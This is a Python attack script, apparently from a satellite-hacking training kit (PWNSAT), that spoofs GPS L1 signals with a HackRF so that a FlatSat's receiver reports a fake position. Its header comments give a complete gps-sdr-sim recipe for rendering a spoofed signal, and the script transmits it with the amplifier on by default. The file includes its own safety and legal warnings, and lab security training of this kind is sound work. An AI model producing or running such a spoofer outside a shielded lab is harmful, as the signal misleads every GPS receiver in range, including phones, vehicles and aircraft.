#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 04_gps_spoofing_rf.py -- GPS L1 spoofing against the FlatSat's onboard GPS
# receiver, so it reports a fake position (default: Area 51, 37.2431N
# -115.7930W) instead of its real one.
#
# Different attack surface than the rest of this set: 00/01/02/03/07 hit the
# CCSDS/LoRa link (918/916MHz SX1262 radios); this hits the FlatSat's
# separate hardware GPS module (real NMEA into Serial1) by overpowering the
# real GPS L1 signal (1575.42MHz) with a fake one from gps-sdr-sim. No CCSDS
# packet, no encryption, no APID -- the GPS chip just locks onto whichever L1
# signal is strongest (GPS has no signal authentication).
#
# Shells out to `hackrf_transfer -t` on a PRE-RENDERED raw IQ file from
# gps-sdr-sim (github.com/osqzss/gps-sdr-sim). The IQ file (hundreds of MB)
# is NOT in this repo -- generate your own (see GENERATING A NEW TARGET);
# --bin-file points at it.
#
# SAFETY / LEGAL NOTE -- READ BEFORE RUNNING
# ---------------------------------------------
# This transmits a fake GPS L1 signal over the air, affecting EVERY GPS
# receiver in range (phones, cars, aviation), not just the FlatSat.
# Intentionally transmitting fake GPS is regulated (US: needs FCC
# authorization / experimental licensing) and a real safety issue outside a
# controlled setting. Keep it LOW POWER, SHORT, INDOORS/SHIELDED, antenna
# next to the FlatSat's own GPS antenna. Never near an airport, road, or
# anywhere real navigation depends on GPS. Your call per venue -- this
# script can't enforce it.
#
# GENERATING A NEW TARGET
# --------------------------
# Requires a local gps-sdr-sim build and a RINEX broadcast ephemeris file
# (an older-but-complete brdc file works fine for a spoofing demo; a
# future-dated one fails):
#
#   ./gps-sdr-sim -e brdc0010.22n -l <lat,lon,height_m> -d 60 \
#       -s 2600000 -b 8 -p -o my_target.bin
#
# -l static lat/lon/height (deg, m). -d duration in seconds (keep short).
# -s 2600000 matches HackRF's default sample rate. -b 8 is signed-byte I/Q,
# what hackrf_transfer expects directly. -p holds TX power constant so the
# spoofed signal reliably beats the real one indoors.

import argparse
import shutil
import subprocess
import sys
from pathlib import Path

GPS_L1_FREQ_HZ = 1_575_420_000
DEFAULT_SAMP_RATE = 2_600_000
# Area 51 (Groom Lake), ~37.2431N -115.7930W -- non-political location to
# show the FlatSat "teleporting" on PWNSAT-C3's map widget.
DEFAULT_TARGET_DESCRIPTION = "Area 51 (37.2431N, -115.7930W)"


def transmit(bin_file: str, *, frequency: int, samp_rate: int, tx_gain: int,
            amp: bool, repeat: bool, verbose: bool = True) -> None:
    hackrf_transfer = shutil.which("hackrf_transfer")
    if hackrf_transfer is None:
        raise RuntimeError(
            "hackrf_transfer not found on PATH -- install HackRF tools "
            "(`brew install hackrf`), see PWNSAT-C3's INSTALL.md (github.com/Pwnsat/PWNSAT-C3)"
        )
    cmd = [
        hackrf_transfer, "-t", bin_file,
        "-f", str(frequency), "-s", str(samp_rate), "-x", str(tx_gain),
    ]
    if amp:
        cmd += ["-a", "1"]
    if repeat:
        cmd += ["-R"]
    print(f"[RF] {' '.join(cmd)}")
    if verbose:
        subprocess.run(cmd, text=True)
    else:
        subprocess.run(cmd, text=True, capture_output=True)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--bin-file", required=True,
                        help=f"pre-rendered gps-sdr-sim IQ file to transmit "
                             f"-- not bundled with this repo (hundreds of MB), "
                             f"generate your own, e.g. targeting {DEFAULT_TARGET_DESCRIPTION}, "
                             f"see this file's GENERATING A NEW TARGET note")
    parser.add_argument("--frequency", type=int, default=GPS_L1_FREQ_HZ,
                        help=f"GPS L1 frequency, Hz (default {GPS_L1_FREQ_HZ})")
    parser.add_argument("--sample-rate", type=int, default=DEFAULT_SAMP_RATE,
                        help=f"must match the rate the .bin was rendered at "
                             f"(default {DEFAULT_SAMP_RATE}, HackRF's own default)")
    parser.add_argument("--tx-gain", type=int, default=0,
                        help="HackRF TX (VGA) gain, dB -- default 0 "
                             "(deliberately conservative for GPS L1, see "
                             "SAFETY NOTE; raise gradually, watching for "
                             "reacquisition on the C3 dashboard, rather "
                             "than starting high)")
    parser.add_argument("--amp", action="store_true", default=True,
                        help="enable HackRF's extra amp stage (-a 1, "
                             "default on -- GPS L1 needs real gain to "
                             "compete with any real signal reaching the "
                             "antenna indoors)")
    parser.add_argument("--no-amp", dest="amp", action="store_false",
                        help="disable the amp stage")
    parser.add_argument("--repeat", action="store_true",
                        help="loop the file continuously with hackrf_transfer "
                             "-R instead of transmitting it once and stopping "
                             "-- useful to hold the spoofed fix while you show "
                             "the dashboard; Ctrl+C to stop")
    parser.add_argument("--quiet", action="store_true",
                        help="hide hackrf_transfer's own output")
    args = parser.parse_args()

    if not Path(args.bin_file).is_file():
        sys.exit(f"[!] --bin-file not found: {args.bin_file}\n"
                  f"    Generate one with gps-sdr-sim first -- see this "
                  f"file's GENERATING A NEW TARGET note.")

    print("=" * 66)
    print("PWNSAT GPS L1 spoofing -- attacks the FlatSat's real onboard GPS")
    print("module (New-firmware/sensors.cpp gpsPoll/gpsRead), NOT the")
    print("CCSDS/LoRa uplink-downlink link every other attack here targets.")
    print(f"Target: {args.bin_file}")
    print("SAFETY: keep power low, transmission short, indoors -- see this")
    print("file's own SAFETY / LEGAL NOTE before raising --tx-gain.")
    print("=" * 66)

    transmit(args.bin_file, frequency=args.frequency, samp_rate=args.sample_rate,
             tx_gain=args.tx_gain, amp=args.amp, repeat=args.repeat,
             verbose=not args.quiet)

    print("\n[+] Done. Check PWNSAT-C3's GPS/NAV panel and map widget for the")
    print("    spoofed fix -- may take a few seconds for the receiver to drop")
    print("    the real signal (if any) and reacquire the fake one.")


if __name__ == "__main__":
    main()
